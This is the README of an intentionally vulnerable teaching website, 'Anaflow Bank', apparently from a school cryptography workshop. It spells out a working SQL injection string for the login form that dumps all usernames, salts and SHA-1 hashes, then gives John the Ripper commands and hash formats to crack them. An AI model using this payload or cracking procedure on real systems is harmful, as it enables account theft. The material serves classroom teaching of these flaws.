Anaflow Bank (Insecure Website)
-------------------------------

This website is a demonstration in a cryptography workshop at Independence 
High School and Stanford Splash, run by Andy Chen and Nick Hirning. It is 
meant to serve as a simplified model of how password hashing and SQL injection 
can work. The code creates a dummy website "Anaflow Bank" whose data can be 
compromised with a SQL injection.


Get Started
-----------

As a prerequisite, make sure you have web.py (version 0.3) and SQLite 
capabilities. Begin by creating the database of user accounts:

sqlite3 BankAccount.db < create_accounts.sql

Then, to run the website, execute:

python anaflow_bank.py [optional port number, default is 8080]


Demonstration Overview
----------------------

In the demonstration, we perform an SQL injection via the login form. We set
the username to be:

' OR 1=1 UNION SELECT GROUP_CONCAT(Username || ' : ' || PasswordHash || ' : ' || Salt, '  ||  ') AS Amount FROM BankAccount WHERE '1' = '1

(The password can be any string.) This allows us to see all of the users' 
salts and password hashes, which are SHA-1 for this purpose. We then use 
John the Ripper (JTR) to expose any weak passwords. Despite each account 
having its own salt, JTR can crack salted SHA-1 hashes in a single file.
To do so, create a blank password file, and format each username/salt/hash 
combination on each line (without the brackets).

In the MacOS version of John 1.7.9-jumbo-7 (see 
http://openwall.info/wiki/john/custom-builds#Compiled-for-Mac-OS-X), 
format each line of the password file as:

[username]:$SHA1p$[salt]$[hash]

For example:

admin:$SHA1p$*Utf&+s5$317fe16a5f409e871b21c3460a75dab8dc906767

Then, run JTR to recover some of the passwords. 

./john --format=sha1-gen [password file]

./john --show [password file] 


For the Windows version of John 1.7.9-jumbo-7-Win-32 (see 
http://openwall.info/wiki/john/custom-builds#Compiled-for-Windows).
format each line of the password file as:

[username]:$dynamic_25$[hash]$[salt]

For example:

admin:$dynamic_25$317fe16a5f409e871b21c3460a75dab8dc906767$*Utf&+s5

Then, run JTR to recover some of the passwords. 

john [password file]

john --show [password file] 


Disclaimer
----------

Do NOT use this code for any application meant to be cryptographically secure.
We intentionally left this system vulnerable to attack. Major flaws include:

- SQL injection (an adversary can display the table of user accounts)
- Malfunctioning SQL queries with certain usernames (generalization of the 
	first flaw)
- SHA-1 hashing instead of slow hashing, such as bcrypt (though for large 
	user databases, this could require client-side hashing. However, an 
	attacker who has stolen the table of users and password hashes can then 
	send a hash directly to the server and successfully login.)
- Lack of security checks, mainly in the Python web.py backend
